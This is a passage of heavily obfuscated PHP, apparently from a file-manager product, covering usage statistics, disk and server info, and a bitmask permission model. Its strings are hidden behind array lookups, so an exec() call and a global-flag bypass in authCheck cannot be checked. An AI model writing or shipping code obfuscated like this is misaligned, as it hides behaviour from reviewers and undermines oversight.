eÎ™Ô”ÈéÙ: foreach ($DÖëÚŒÍÙ as $eŒ›İË½ÖÉ) { $this->{$Cñ—İöåØĞ}($eŒ›İË½ÖÉ); } return $this->listData(); goto BÓôù§”…; BÓôù§”…: } private function dateList($Dğè°ÖÑ«) { $F¶¦Õ˜ŠÚ„ =& $_SERVER[òÀöí]; $aæ¹„İ‡» = $Dğè°ÖÑ«; $bÌ õ¹¼ = strtotime($F¶¦Õ˜ŠÚ„[1597]); $dÍÈÊèÑõÎ = array(); while ($aæ¹„İ‡» <= $bÌ õ¹¼) { $dÍÈÊèÑõÎ[] = date($F¶¦Õ˜ŠÚ„[1596], $aæ¹„İ‡»); $aæ¹„İ‡» = strtotime($F¶¦Õ˜ŠÚ„[1599], $aæ¹„İ‡»); } return $dÍÈÊèÑõÎ; } public function _recordUser($d½ÀäÀ Ñ = '') { goto fÖÃÜóî¼; bÉÒ¡¦ç”­: $E«Å“†ææ¢ = array($a¦„ˆœİÁï[220] => $d½ÀäÀ Ñ, $a¦„ˆœİÁï[719] => (int) $FÏİƒ‡êÇ¶, $a¦„ˆœİÁï[1589] => (int) $aæè ç›õ§, $a¦„ˆœİÁï[1590] => (int) $A©ÕÈÏóøİ); return $this->insert($E«Å“†ææ¢); goto BÓ„íÍ÷Ôº; fÖÃÜóî¼: $a¦„ˆœİÁï =& $_SERVER[òÀöí]; $eÃø¥ö«Ö = strtotime(date($a¦„ˆœİÁï[1600], strtotime($d½ÀäÀ Ñ))); $c¿ç¦¤º²Å = strtotime(date($a¦„ˆœİÁï[1601], strtotime($d½ÀäÀ Ñ))); goto d‚©­Ç“Ç»; d‚©­Ç“Ç»: $d‚Ä‰ìŸì‰ = array($a¦„ˆœİÁï[192] => array($a¦„ˆœİÁï[949], $c¿ç¦¤º²Å)); $FÏİƒ‡êÇ¶ = Model($a¦„ˆœİÁï[495])->where($d‚Ä‰ìŸì‰)->count($a¦„ˆœİÁï[1504]); $d‚Ä‰ìŸì‰[$a¦„ˆœİÁï[192]] = array($a¦„ˆœİÁï[329], array($eÃø¥ö«Ö, $c¿ç¦¤º²Å)); goto FÉ‚Ò»¶ÍŒ; FÉ‚Ò»¶ÍŒ: $aæè ç›õ§ = Model($a¦„ˆœİÁï[495])->where($d‚Ä‰ìŸì‰)->count($a¦„ˆœİÁï[1504]); $d‚Ä‰ìŸì‰[$a¦„ˆœİÁï[29]] = $a¦„ˆœİÁï[1602]; $A©ÕÈÏóøİ = Model($a¦„ˆœİÁï[1603])->where($d‚Ä‰ìŸì‰)->count($a¦„ˆœİÁï[1604]); goto bÉÒ¡¦ç”­; BÓ„íÍ÷Ôº: } public function _recordStore($EŞŸîîÓ› = '') { goto cîÅ¨Ìó¬; CÜß£ìèÉ¹: $Bâš™¤¢Õ‘ = Model($F“…›·óù[778])->where($aë“ğºôó‰)->sum($F“…›·óù[77]); $aˆÎÍ¸æ‰ = array($F“…›·óù[220] => $EŞŸîîÓ›, $F“…›·óù[717] => (int) $CÙÒÁœÇãê, $F“…›·óù[1593] => (int) $dğ–‰¾†´, $F“…›·óù[1594] => (int) $a°¿‰îÜ¤‘, $F“…›·óù[1595] => (int) $Bâš™¤¢Õ‘); return $this->insert($aˆÎÍ¸æ‰); goto A’ù¡«ÙÉ; cîÅ¨Ìó¬: $F“…›·óù =& $_SERVER[òÀöí]; $F¬å‰Ì°÷ = strtotime(date($F“…›·óù[1601], strtotime($EŞŸîîÓ›))); $aë“ğºôó‰ = array($F“…›·óù[192] => array($F“…›·óù[949], $F¬å‰Ì°÷)); goto fàïÍ¤©¶…; fàïÍ¤©¶…: $dğ–‰¾†´ = Model($F“…›·óù[439])->where($aë“ğºôó‰)->sum($F“…›·óù[77]); $aë“ğºôó‰[$F“…›·óù[388]] = 0; $CÙÒÁœÇãê = Model($F“…›·óù[778])->where($aë“ğºôó‰)->sum($F“…›·óù[77]); goto aë…İŸ¼¥¹; aë…İŸ¼¥¹: $aë“ğºôó‰[$F“…›·óù[389]] = 1; $a°¿‰îÜ¤‘ = Model($F“…›·óù[778])->where($aë“ğºôó‰)->sum($F“…›·óù[77]); $aë“ğºôó‰[$F“…›·óù[389]] = 2; goto CÜß£ìèÉ¹; A’ù¡«ÙÉ: } public function trend($F„÷›æÏÊ‘, $cöØí·´”–) { goto BĞäŠËööÚ; BĞäŠËööÚ: $F¾÷£·‡ç¢ =& $_SERVER[òÀöí]; if (!$this->init($F„÷›æÏÊ‘)) { return !1; } $Dˆù ¢Ìõ¯ = $this->trendList($F„÷›æÏÊ‘); goto Dò”Ü£…Õ; c•·ëó‘ç: return $E›ö¹Ï©; goto FÀ¬ªƒÙæ; Dò”Ü£…Õ: if ($Dˆù ¢Ìõ¯ && $cöØí·´”– != $F¾÷£·‡ç¢[1478]) { $C‡Õä¢±î  = $Dˆù ¢Ìõ¯[0][$F¾÷£·‡ç¢[220]]; $fØíŞ‚Çàœ = $this->validDate($cöØí·´”–, $C‡Õä¢±î ); $D¯¯ö°„›¾ = array(); $DÂÚ•—£’¶ = array_to_keyvalue($Dˆù ¢Ìõ¯, $F¾÷£·‡ç¢[220]); foreach ($fØíŞ‚Çàœ as $Aù·¿áï¬ß) { if (isset($DÂÚ•—£’¶[$Aù·¿áï¬ß])) { $b˜°ğğÈ…† = $DÂÚ•—£’¶[$Aù·¿áï¬ß]; } else { $b˜°ğğÈ…† = end($Dˆù ¢Ìõ¯); $b˜°ğğÈ…†[$F¾÷£·‡ç¢[220]] = $Aù·¿áï¬ß; if ($F„÷›æÏÊ‘ == $F¾÷£·‡ç¢[551]) { $b˜°ğğÈ…†[$F¾÷£·‡ç¢[1589]] = $b˜°ğğÈ…†[$F¾÷£·‡ç¢[1590]] = 0; } } $D¯¯ö°„›¾[] = $b˜°ğğÈ…†; } $Dˆù ¢Ìõ¯ = $D¯¯ö°„›¾; } $CôëÊæì¶­ = array($F¾÷£·‡ç¢[551] => array($F¾÷£·‡ç¢[719] => LNG($F¾÷£·‡ç¢[1605]), $F¾÷£·‡ç¢[1589] => LNG($F¾÷£·‡ç¢[1606]), $F¾÷£·‡ç¢[1590] => LNG($F¾÷£·‡ç¢[1607])), $F¾÷£·‡ç¢[1591] => array($F¾÷£·‡ç¢[717] => LNG($F¾÷£·‡ç¢[1608]), $F¾÷£·‡ç¢[1593] => LNG($F¾÷£·‡ç¢[1609]), $F¾÷£·‡ç¢[1594] => LNG($F¾÷£·‡ç¢[1610]), $F¾÷£·‡ç¢[1595] => LNG($F¾÷£·‡ç¢[1611]))); $f•ÏÂ¶ÍÊ± = array($F¾÷£·‡ç¢[551] => $F¾÷£·‡ç¢[1612], $F¾÷£·‡ç¢[1591] => $F¾÷£·‡ç¢[77]); goto Dê¦ùÍ•Ì•; Dê¦ùÍ•Ì•: if (empty($Dˆù ¢Ìõ¯)) { $Aù·¿áï¬ß = date($F¾÷£·‡ç¢[1596], strtotime($F¾÷£·‡ç¢[1597])); $fäååê‹È‰ = array($F¾÷£·‡ç¢[220] => $Aù·¿áï¬ß); foreach ($CôëÊæì¶­[$F„÷›æÏÊ‘] as $EÃïèšª¡† => $c Æ½ğà¢) { $fäååê‹È‰[$EÃïèšª¡†] = 0; } $Dˆù ¢Ìõ¯[] = $fäååê‹È‰; } $E›ö¹Ï© = array(); foreach ($Dˆù ¢Ìõ¯ as $c Æ½ğà¢) { if ($F„÷›æÏÊ‘ == $F¾÷£·‡ç¢[1591] && $c Æ½ğà¢[$F¾÷£·‡ç¢[1593]] > $c Æ½ğà¢[$F¾÷£·‡ç¢[717]]) { $c Æ½ğà¢[$F¾÷£·‡ç¢[1593]] = $c Æ½ğà¢[$F¾÷£·‡ç¢[717]]; } foreach ($CôëÊæì¶­[$F„÷›æÏÊ‘] as $EÃïèšª¡† => $eÄÏÜ¬Ã‹½) { $b˜°ğğÈ…† = array($F¾÷£·‡ç¢[220] => $c Æ½ğà¢[$F¾÷£·‡ç¢[220]], $F¾÷£·‡ç¢[1409] => $eÄÏÜ¬Ã‹½); $b˜°ğğÈ…†[$f•ÏÂ¶ÍÊ±[$F„÷›æÏÊ‘]] = isset($c Æ½ğà¢[$EÃïèšª¡†]) ? $c Æ½ğà¢[$EÃïèšª¡†] : 0; $E›ö¹Ï©[] = $b˜°ğğÈ…†; } } goto c•·ëó‘ç; FÀ¬ªƒÙæ: } public function validDate($b§·—Çñˆ‡, $C‰æ¬ëÑ) { goto d‚ö¬™è”ç; d‚ö¬™è”ç: $Fì©ˆêªøŠ =& $_SERVER[òÀöí]; $Dº‹¿Ÿ­Ñ = date($Fì©ˆêªøŠ[1596], strtotime($Fì©ˆêªøŠ[1597])); $EŒ°óô‘³º = array($Dº‹¿Ÿ­Ñ); goto E„èáÑšç; E„èáÑšç: switch ($b§·—Çñˆ‡) { case $Fì©ˆêªøŠ[1485]: $FæÉ”‘Ñ = mktime(0, 0, 0, date($Fì©ˆêªøŠ[1613]), date($Fì©ˆêªøŠ[1227]) - date($Fì©ˆêªøŠ[1289]) + 7 - 7, date($Fì©ˆêªøŠ[1614])); $b‰—õ¼æê— = 0; do { $E‹ƒïššó = date($Fì©ˆêªøŠ[1596], $FæÉ”‘Ñ - 3600 * 24 * 7 * $b‰—õ¼æê—); $EŒ°óô‘³º[] = $E‹ƒïššó; $b‰—õ¼æê—++; } while ($C‰æ¬ëÑ < $E‹ƒïššó); break; case $Fì©ˆêªøŠ[1483]: $b‰—õ¼æê— = 1; do { $B¡’•ÂÂŠ = date($Fì©ˆêªøŠ[1615], strtotime("\55\x20{$b‰—õ¼æê—}\x20\x6d\x6f\x6e\x74\150\x73")); $EŒ°óô‘³º[] = $B¡’•ÂÂŠ; $b‰—õ¼æê—++; } while ($C‰æ¬ëÑ < $B¡’•ÂÂŠ); break; case $Fì©ˆêªøŠ[1616]: $CÀšÁğãƒô = (int) date($Fì©ˆêªøŠ[1614], strtotime($C‰æ¬ëÑ)); $B¢Ã‹»òÇŞ = (int) date($Fì©ˆêªøŠ[1614]); if ($CÀšÁğãƒô >= $B¢Ã‹»òÇŞ) { break; } for ($CÀšÁğãƒô; $CÀšÁğãƒô < $B¢Ã‹»òÇŞ; $CÀšÁğãƒô++) { $EŒ°óô‘³º[] = $CÀšÁğãƒô . $Fì©ˆêªøŠ[1617]; } break; default: break; } if ($C‰æ¬ëÑ > end($EŒ°óô‘³º)) { array_pop($EŒ°óô‘³º); } sort($EŒ°óô‘³º); goto cªª¤´™¾; cªª¤´™¾: return $EŒ°óô‘³º; goto Bˆ»ÔË¶Øó; Bˆ»ÔË¶Øó: } public function listTable($bØ¹ˆšéÌ) { $DÕ›¯†¶‚ø = ucfirst($bØ¹ˆšéÌ); return Model($DÕ›¯†¶‚ø)->listData(); } public function option($d°†Ö´Ç´) { $e³ÒİÔ¦ á = $_SERVER[òÀöí][1618] . ucfirst($d°†Ö´Ç´); return $this->{$e³ÒİÔ¦ á}(); } private function optionUser() { goto fÖÊŸè·‹Ê; FØ¿ÔÇ±¾ß: $DÎç°“´í = strtotime($A¹¼•…äì™[1620]); $AÆ´¯ŒÓ´… = array($A¹¼•…äì™[1621] => array($A¹¼•…äì™[950], $DÎç°“´í)); $A«¡Ä¥ò…“ = (int) Model($A¹¼•…äì™[495])->where($AÆ´¯ŒÓ´…)->count($A¹¼•…äì™[1504]); goto c˜á¾»ºÚ; fÖÊŸè·‹Ê: $A¹¼•…äì™ =& $_SERVER[òÀöí]; $BµÀöøêå = Model($A¹¼•…äì™[495])->count($A¹¼•…äì™[1504]); $Eº•×ï»¼ì = Model($A¹¼•…äì™[495])->where($A¹¼•…äì™[1619])->count($A¹¼•…äì™[1504]); goto FØ¿ÔÇ±¾ß; E©¬‚º†Ü: $Cõï—ŒŞİ = Model($A¹¼•…äì™[495])->where($AÆ´¯ŒÓ´…)->count($A¹¼•…äì™[1504]); return array($A¹¼•…äì™[714] => (int) $BµÀöøêå, $A¹¼•…äì™[1622] => (int) ($BµÀöøêå - $Eº•×ï»¼ì), $A¹¼•…äì™[1623] => (int) $Eº•×ï»¼ì, $A¹¼•…äì™[1624] => (int) $Cõï—ŒŞİ, $A¹¼•…äì™[1625] => $A«¡Ä¥ò…“); goto CŒŠÓŒ²ùù; c˜á¾»ºÚ: if (!$A«¡Ä¥ò…“) { $A«¡Ä¥ò…“ = 1; } $DÎç°“´í = strtotime(date($A¹¼•…äì™[1600])); $AÆ´¯ŒÓ´… = array($A¹¼•…äì™[1621] => array($A¹¼•…äì™[950], $DÎç°“´í)); goto E©¬‚º†Ü; CŒŠÓŒ²ùù: } private function optionFile() { goto D»‰ïåó›ç; A˜ƒ÷»Å‹½: $aš¡Ä›‘ = Model($D÷›Ê…ˆ³²[778])->where($C’İØÍ¤¹)->sum($D÷›Ê…ˆ³²[77]); $cé“ô¬¼öô = Model($D÷›Ê…ˆ³²[778])->where($C’İØÍ¤¹)->count($D÷›Ê…ˆ³²[387]); return array($D÷›Ê…ˆ³²[717] => $f“²µİŠ, $D÷›Ê…ˆ³²[1593] => $A—ÚÏ³êÖ¾, $D÷›Ê…ˆ³²[1626] => $f“²µİŠ - $A—ÚÏ³êÖ¾, $D÷›Ê…ˆ³²[1627] => (int) $aš¡Ä›‘, $D÷›Ê…ˆ³²[719] => (int) $AÔ¯›­†¦ƒ, $D÷›Ê…ˆ³²[1628] => (int) $cé“ô¬¼öô); goto b×íµÏ×ç; D»‰ïåó›ç: $D÷›Ê…ˆ³² =& $_SERVER[òÀöí]; $Cò‚–ƒêÄ = $this->sourceSize(); $f“²µİŠ = $Cò‚–ƒêÄ[$D÷›Ê…ˆ³²[77]]; goto BŸ¿³—“¦•; BŸ¿³—“¦•: $A—ÚÏ³êÖ¾ = $Cò‚–ƒêÄ[$D÷›Ê…ˆ³²[1593]]; $AÔ¯›­†¦ƒ = Model($D÷›Ê…ˆ³²[778])->where(array($D÷›Ê…ˆ³²[388] => 0))->count($D÷›Ê…ˆ³²[387]); $C’İØÍ¤¹ = array($D÷›Ê…ˆ³²[388] => 0, $D÷›Ê…ˆ³²[192] => array($D÷›Ê…ˆ³²[950], strtotime(date($D÷›Ê…ˆ³²[1600])))); goto A˜ƒ÷»Å‹½; b×íµÏ×ç: } private function optionAccess() { $eÚáï™·´ï =& $_SERVER[òÀöí]; return array($eÚáï™·´ï[714] => $this->typeLogCnt(), $eÚáï™·´ï[106] => $this->typeLogCnt($eÚáï™·´ï[106]), $eÚáï™·´ï[421] => $this->typeLogCnt($eÚáï™·´ï[421]), $eÚáï™·´ï[1629] => $this->typeLogCnt($eÚáï™·´ï[1629]), $eÚáï™·´ï[1630] => $this->typeLogCnt($eÚáï™·´ï[1630]), $eÚáï™·´ï[551] => $this->typeLogCnt($eÚáï™·´ï[33], $eÚáï™·´ï[1604])); } private function typeLogCnt($F¹ÍäåÖâ† = '', $EõÍ³Èå÷× = "\151\144") { goto A—Õö¬«¨; f˜œ¬õí­ç: return (int) $FöÁäÆªäâ; goto BàÂíÓì‡¨; A—Õö¬«¨: $CóĞ¤˜µ™… =& $_SERVER[òÀöí]; $FŠ–ë•‚·½ = array($CóĞ¤˜µ™…[106] => array($CóĞ¤˜µ™…[1631], $CóĞ¤˜µ™…[1632]), $CóĞ¤˜µ™…[421] => array($CóĞ¤˜µ™…[1633], $CóĞ¤˜µ™…[1634]), $CóĞ¤˜µ™…[1629] => array($CóĞ¤˜µ™…[1635], $CóĞ¤˜µ™…[1636], $CóĞ¤˜µ™…[1637]), $CóĞ¤˜µ™…[1630] => array($CóĞ¤˜µ™…[1638], $CóĞ¤˜µ™…[1639]), $CóĞ¤˜µ™…[1640] => array($CóĞ¤˜µ™…[1641], $CóĞ¤˜µ™…[1642], $CóĞ¤˜µ™…[1643])); $Cè¹Õæ‰È = strtotime(date($CóĞ¤˜µ™…[1600])); goto A—±ï½òß¡; A—±ï½òß¡: $d¢½†¯®Æ´ = array($CóĞ¤˜µ™…[192] => array($CóĞ¤˜µ™…[950], $Cè¹Õæ‰È)); if ($F¹ÍäåÖâ†) { $d¢½†¯®Æ´[$CóĞ¤˜µ™…[29]] = array($CóĞ¤˜µ™…[7], $FŠ–ë•‚·½[$F¹ÍäåÖâ†]); } $FöÁäÆªäâ = Model($CóĞ¤˜µ™…[1603])->where($d¢½†¯®Æ´)->count($EõÍ³Èå÷×); goto f˜œ¬õí­ç; BàÂíÓì‡¨: } private function optionServer() { goto dôÃÖÑõÑ±; cÄÜ£±¸÷‹: $c‚ê£Ò–½ = array($B×ËÊÙçÂ¼[770] => $CÉ¢ˆÒš‚«[$B×ËÊÙçÂ¼[385]]); $B¨·½Ù‡Ç = Model($B×ËÊÙçÂ¼[439])->where($c‚ê£Ò–½)->sum($B×ËÊÙçÂ¼[77]); $c¯×¢Ñ½•Ã = explode($B×ËÊÙçÂ¼[50], $_SERVER[$B×ËÊÙçÂ¼[141]]); goto bìÍÅ¶Ÿß™; e®ëğ„ï³: return array($B×ËÊÙçÂ¼[1646] => $E¡²ÛùÀÅ¶ ? $E¡²ÛùÀÅ¶[$B×ËÊÙçÂ¼[1647]] : 0, $B×ËÊÙçÂ¼[1648] => $E¡²ÛùÀÅ¶ ? $E¡²ÛùÀÅ¶[$B×ËÊÙçÂ¼[1649]] : 0, $B×ËÊÙçÂ¼[1650] => (int) $CÉ¢ˆÒš‚«[$B×ËÊÙçÂ¼[1647]] * 1024 * 1024 * 1024, $B×ËÊÙçÂ¼[1651] => (int) $B¨·½Ù‡Ç, $B×ËÊÙçÂ¼[1652] => ucfirst($a¾‹Ÿ¹±ùİ), $B×ËÊÙçÂ¼[1653] => $B×ËÊÙçÂ¼[1654] . PHP_VERSION, $B×ËÊÙçÂ¼[1655] => phpBuild64() ? 64 : 32, $B×ËÊÙçÂ¼[713] => str_replace($B×ËÊÙçÂ¼[1656], $B×ËÊÙçÂ¼[927], $A®º…Š¶ë), $B×ËÊÙçÂ¼[345] => ucfirst($Aõå“ØËÈ), $B×ËÊÙçÂ¼[28] => $_SERVER[$B×ËÊÙçÂ¼[1657]]); goto e­ìº¨™äÇ; fíù‰µ”©ï: if ($A®º…Š¶ë == $B×ËÊÙçÂ¼[742]) { $Cˆ—®ëâ¼Û = explode($B×ËÊÙçÂ¼[1141], $dº™º­Ô†µ[$B×ËÊÙçÂ¼[910]]); $A®º…Š¶ë = $Cˆ—®ëâ¼Û[0]; } if ($A®º…Š¶ë == $B×ËÊÙçÂ¼[745] || $A®º…Š¶ë == $B×ËÊÙçÂ¼[746]) { $Fæ¢Õ°Â = Model()->db()->query($B×ËÊÙçÂ¼[1644]); $E¢°ä¬¾î¾ = $Fæ¢Õ°Â[0] && isset($Fæ¢Õ°Â[0][$B×ËÊÙçÂ¼[1408]]) ? $Fæ¢Õ°Â[0][$B×ËÊÙçÂ¼[1408]] : 0; $A®º…Š¶ë = $B×ËÊÙçÂ¼[1645] . ($E¢°ä¬¾î¾ ? $B×ËÊÙçÂ¼[8] . $E¢°ä¬¾î¾ : $B×ËÊÙçÂ¼[33]); } $Aõå“ØËÈ = $GLOBALS[$B×ËÊÙçÂ¼[6]][$B×ËÊÙçÂ¼[345]][$B×ËÊÙçÂ¼[780]]; goto e®ëğ„ï³; bìÍÅ¶Ÿß™: $a¾‹Ÿ¹±ùİ = $c¯×¢Ñ½•Ã[0]; $dº™º­Ô†µ = $GLOBALS[$B×ËÊÙçÂ¼[6]][$B×ËÊÙçÂ¼[17]]; $A®º…Š¶ë = $dº™º­Ô†µ[$B×ËÊÙçÂ¼[911]]; goto fíù‰µ”©ï; dôÃÖÑõÑ±: $B×ËÊÙçÂ¼ =& $_SERVER[òÀöí]; $E¡²ÛùÀÅ¶ = $this->diskDriver(); $CÉ¢ˆÒš‚« = KodIO::defaultDriver(); goto cÄÜ£±¸÷‹; e­ìº¨™äÇ: } private function diskDriver() { goto f—¶Üø¸öò; f—¶Üø¸öò: $eŸëîËÂµä =& $_SERVER[òÀöí]; $càñÄ¬ïã‘ = $eŸëîËÂµä[8]; $f·Ø¥âà¦Â = $GLOBALS[$eŸëîËÂµä[6]][$eŸëîËÂµä[1658]] == $eŸëîËÂµä[1659]; goto e£·âŒ­´; e£·âŒ­´: if ($f·Ø¥âà¦Â) { $càñÄ¬ïã‘ = $eŸëîËÂµä[1660]; if (function_exists($eŸëîËÂµä[1661])) { exec($eŸëîËÂµä[1662], $Bªä‰°¢©); $càñÄ¬ïã‘ = $Bªä‰°¢©[1] . $eŸëîËÂµä[8]; } } if (!file_exists($càñÄ¬ïã‘)) { return; } $a¾Ø¨£²¿ã = @disk_total_space($càñÄ¬ïã‘); goto DøïãöÈÓ; DøïãöÈÓ: $FÛŞ—ÒÓï = $a¾Ø¨£²¿ã - @disk_free_space($càñÄ¬ïã‘); return array($eŸëîËÂµä[1647] => $a¾Ø¨£²¿ã, $eŸëîËÂµä[1649] => $FÛŞ—ÒÓï); goto DÜ£é‚²£; DÜ£é‚²£: } public function fileChart($cÂŒÈî–) { goto fÔŒõ÷„î; aˆÎË„ÆßÚ: $F»ê”ĞÅ¤• = $this->sourceSize(); $cÊŞÏÁ¶ÈØ = array($Dë³˜“Ü²[479] => 0, $Dë³˜“Ü²[389] => 1); $FŒõÑµ¤Šè = Model($Dë³˜“Ü²[778])->where($cÊŞÏÁ¶ÈØ)->sum($Dë³˜“Ü²[77]); goto a»À‹ˆ™­œ; a»À‹ˆ™­œ: $cÊŞÏÁ¶ÈØ[$Dë³˜“Ü²[389]] = 2; $dåÀ“Ø‘Â• = Model($Dë³˜“Ü²[778])->where($cÊŞÏÁ¶ÈØ)->sum($Dë³˜“Ü²[77]); return array($Dë³˜“Ü²[717] => $F»ê”ĞÅ¤•[$Dë³˜“Ü²[77]], $Dë³˜“Ü²[1593] => $F»ê”ĞÅ¤•[$Dë³˜“Ü²[1593]], $Dë³˜“Ü²[1594] => (int) $FŒõÑµ¤Šè, $Dë³˜“Ü²[1595] => (int) $dåÀ“Ø‘Â•); goto AÔï±¹æµÆ; fÔŒõ÷„î: $Dë³˜“Ü² =& $_SERVER[òÀöí]; if (isset($cÂŒÈî–[$Dë³˜“Ü²[1504]])) { return Model($Dë³˜“Ü²[778])->userFileTypeProfile($cÂŒÈî–[$Dë³˜“Ü²[1504]]); } if (isset($cÂŒÈî–[$Dë³˜“Ü²[1663]])) { return Model($Dë³˜“Ü²[778])->groupFileTypeProfile($cÂŒÈî–[$Dë³˜“Ü²[1663]]); } goto aˆÎË„ÆßÚ; AÔï±¹æµÆ: } private function sourceSize() { $cƒñËÁ¢ë =& $_SERVER[òÀöí]; $b‹¹¢çÍ¢Š = Model($cƒñËÁ¢ë[778])->where(array($cƒñËÁ¢ë[388] => 0))->sum($cƒñËÁ¢ë[77]); $EÒµÉã¥¿Ù = Model($cƒñËÁ¢ë[439])->sum($cƒñËÁ¢ë[77]); if ($EÒµÉã¥¿Ù > $b‹¹¢çÍ¢Š) { $EÒµÉã¥¿Ù = $b‹¹¢çÍ¢Š; } return array($cƒñËÁ¢ë[77] => (int) $b‹¹¢çÍ¢Š, $cƒñËÁ¢ë[1593] => (int) $EÒµÉã¥¿Ù); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $b¨Ÿ§ÉÍÛÚ =& $_SERVER[òÀöí]; $bÂ¾œ¶ÑĞÖ = array(array($b¨Ÿ§ÉÍÛÚ[404] => LNG($b¨Ÿ§ÉÍÛÚ[1664]), $b¨Ÿ§ÉÍÛÚ[1665] => $b¨Ÿ§ÉÍÛÚ[1666], $b¨Ÿ§ÉÍÛÚ[1667] => 1, $b¨Ÿ§ÉÍÛÚ[1668] => 1, $b¨Ÿ§ÉÍÛÚ[1669] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($b¨Ÿ§ÉÍÛÚ[404] => LNG($b¨Ÿ§ÉÍÛÚ[1670]), $b¨Ÿ§ÉÍÛÚ[1665] => $b¨Ÿ§ÉÍÛÚ[1671], $b¨Ÿ§ÉÍÛÚ[1667] => 2, $b¨Ÿ§ÉÍÛÚ[1668] => 1, $b¨Ÿ§ÉÍÛÚ[1669] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($b¨Ÿ§ÉÍÛÚ[404] => LNG($b¨Ÿ§ÉÍÛÚ[1672]), $b¨Ÿ§ÉÍÛÚ[1665] => $b¨Ÿ§ÉÍÛÚ[1673], $b¨Ÿ§ÉÍÛÚ[1667] => 3, $b¨Ÿ§ÉÍÛÚ[1668] => 1, $b¨Ÿ§ÉÍÛÚ[1669] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($b¨Ÿ§ÉÍÛÚ[404] => LNG($b¨Ÿ§ÉÍÛÚ[1674]), $b¨Ÿ§ÉÍÛÚ[1665] => $b¨Ÿ§ÉÍÛÚ[1675], $b¨Ÿ§ÉÍÛÚ[1667] => 4, $b¨Ÿ§ÉÍÛÚ[1668] => 1, $b¨Ÿ§ÉÍÛÚ[1669] => self::AUTH_SHOW | self::AUTH_VIEW), array($b¨Ÿ§ÉÍÛÚ[404] => LNG($b¨Ÿ§ÉÍÛÚ[1676]), $b¨Ÿ§ÉÍÛÚ[1665] => $b¨Ÿ§ÉÍÛÚ[1677], $b¨Ÿ§ÉÍÛÚ[1667] => 5, $b¨Ÿ§ÉÍÛÚ[1668] => 1, $b¨Ÿ§ÉÍÛÚ[1669] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($b¨Ÿ§ÉÍÛÚ[404] => LNG($b¨Ÿ§ÉÍÛÚ[1678]), $b¨Ÿ§ÉÍÛÚ[1665] => $b¨Ÿ§ÉÍÛÚ[1679], $b¨Ÿ§ÉÍÛÚ[1667] => 6, $b¨Ÿ§ÉÍÛÚ[1668] => 1, $b¨Ÿ§ÉÍÛÚ[1669] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($b¨Ÿ§ÉÍÛÚ[404] => LNG($b¨Ÿ§ÉÍÛÚ[1680]), $b¨Ÿ§ÉÍÛÚ[1665] => $b¨Ÿ§ÉÍÛÚ[1681], $b¨Ÿ§ÉÍÛÚ[1667] => 7, $b¨Ÿ§ÉÍÛÚ[1668] => 1, $b¨Ÿ§ÉÍÛÚ[1669] => 0)); return $bÂ¾œ¶ÑĞÖ; } public static function authCheck($FÕ¾ºàÙšš, $FôíŠÕœËô) { $FÕ¾ºàÙšš = intval($FÕ¾ºàÙšš); if (_get($GLOBALS, $_SERVER[òÀöí][475])) { return !0; } if ($FÕ¾ºàÙšš <= 0) { return !1; } if (($FÕ¾ºàÙšš & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($FÕ¾ºàÙšš & $FôíŠÕœËô); } public static function authCheckShow($a¬ÈœÔÉã–) { return self::authCheck($a¬ÈœÔÉã–, self::AUTH_SHOW); } public static function authCheckView($bá¸œØæõ¡) { return self::authCheck($bá¸œØæõ¡, self::AUTH_VIEW); } public static function authCheckDownload($BÓ›ƒ—›×”) { return self::authCheck($BÓ›ƒ—›×”, self::AUTH_DOWNLOAD); } public static function authCheckUpload($F³¯äØ«Øô) { return self::authCheck($F³¯äØ«Øô, self::AUTH_UPLOAD); } public static function authCheckEdit($fÅÏ½âáÓ) { return self::authCheck($fÅÏ½âáÓ, self::AUTH_EDIT); } public static function authCheckRemove($dóºÁƒƒ) { return self::authCheck($dóºÁƒƒ, self::AUTH_REMOVE); } public static function authCheckShare($F›°ÛêÜë˜) { return self::authCheck($F›°ÛêÜë˜, self::AUTH_SHARE); } public static function authCheckComment($c«º‹‰Êæ²) { return self::authCheck($c«º‹‰Êæ², self::AUTH_COMMENT); } public static function authCheckEvent($e¿ªÀÌ†Ç) { return self::authCheck($e¿ªÀÌ†Ç, self::AUTH_EVENT); } public static function authCheckRoot($b±ô ¦å†¨) { return self::authCheck($b±ô ¦å†¨, self::AUTH_ROOT); } public static function authCheckAction($C†¨Æ‹¡Ê, $f™ ¿ˆŞŸÆ) { goto bä„óÌñ«Á; bŒ˜ÊÜÄ´Ô: $F³ØŒå©¯Ö = $dâÜÅö«“´[$f™ ¿ˆŞŸÆ]; $C†¨Æ‹¡Ê = intval($C†¨Æ‹¡Ê); if ($C†¨Æ‹¡Ê <= 0) { return !1; } goto Fí’‘ê×ˆÀ; bä„óÌñ«Á: $dÇšµôÉÖ‚ =& $_SERVER[òÀöí]; $dâÜÅö«“´ = array($dÇšµôÉÖ‚[1682] => self::AUTH_VIEW, $dÇšµôÉÖ‚[1072] => self::AUTH_DOWNLOAD, $dÇšµôÉÖ‚[106] => self::AUTH_UPLOAD, $dÇšµôÉÖ‚[1630] => self::AUTH_EDIT, $dÇšµôÉÖ‚[1629] => self::AUTH_REMOVE, $dÇšµôÉÖ‚[1640] => 